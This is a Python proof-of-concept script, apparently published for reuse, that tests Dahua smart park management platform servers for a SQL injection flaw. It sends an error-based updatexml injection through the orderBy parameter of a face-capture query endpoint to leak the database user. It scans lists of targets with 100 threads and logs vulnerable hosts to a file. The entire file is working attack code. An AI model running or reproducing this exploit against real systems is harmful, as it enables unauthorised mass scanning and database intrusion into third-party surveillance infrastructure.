import requests
import re
import argparse
import sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """                                                            
________             ___ ___               
\______ \ _____     /   |   \ __ _______   
 |    |  \\__  \   /    ~    \  |  \__  \  
 |    `   \/ __ \_ \    Y    /  |  // __ \_
/_______  (____  /  \___|_  /|____/(____  /
        \/     \/         \/            \/ 
                               author:gtman       
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="大华智慧园区综合管理平台SQL注入漏洞复现")
    parser.add_argument('-u', '--url', dest='url', type=str, help="Please input link")
    parser.add_argument('-f', '--file', dest='file', type=str, help="Please input file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding="utf-8") as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }
    proxies = {
        'http': "http://127.0.0.1:8080",
        'https': "http://127.0.0.1:8080"
    }
    payload = '/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--%22%7D/extend/%7B%7D'
    try:
        response = requests.get(url=target + payload, headers=headers, verify=False,proxies=proxies)
        if response.status_code == 500 and 'XPATH' in response.text:
            print(f"[*] 该站点 {target} 存在 SQL 注入漏洞")
            with open("result.txt", "a") as fp:
                fp.write(f"{target}" + "\n")
        else:
            print(f"[-] 该站点 {target} 不存在 SQL 注入漏洞")
    except Exception as e:
        print(f"[+] 该站点 {target} 存在访问问题，请手工测试")

if __name__ == "__main__":
    main()